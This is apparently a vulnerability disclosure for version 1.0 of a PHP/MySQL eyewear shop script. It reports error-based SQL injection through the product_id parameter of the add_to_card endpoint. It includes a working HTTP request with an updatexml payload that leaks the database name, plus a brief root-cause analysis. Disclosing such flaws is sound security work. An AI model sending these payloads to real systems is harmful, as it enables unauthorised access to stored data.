## Online Eyewear Shop Website has a front-end SQL injection vulnerability

## Affected version: 
Online Eyewear Shop Website - 1.0

## Software:
https://www.sourcecodester.com/php/16089/online-eyewear-shop-website-using-php-and-mysql-free-download.html

## Vulnerability File:
/oews/classes/Master.php?f=add_to_card

## Description:
Online Eyewear Shop Website1.0 has a SQL injection attack in /oews/classes/Master.php?f=add_to_card, and the attack parameter is product_id. 
Attackers can exploit this vulnerability to directly obtain sensitive information from the server.

Status: CRITICAL

POC
```
POST /oews/classes/Master.php?f=add_to_card HTTP/1.1
Host: localhost
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="101"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=p65p1sp36htfqevfnhij1jvtie
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 68

product_id=1'%20and%20updatexml(1,concat(0x7e,(database())),3)--%20q
```

Get the database name directly through the error report: oews_db

![CleanShot 2025-04-10 at 21 11 33@2x](https://github.com/user-attachments/assets/09a76dab-4e09-485d-80f4-698cc4d3878b)


## Code Analysis
$product_id is directly introduced into the SQL statement, causing SQL injection.

![CleanShot 2025-04-10 at 21 14 04@2x](https://github.com/user-attachments/assets/2a58eb01-1b04-4800-9960-3d574d18e730)


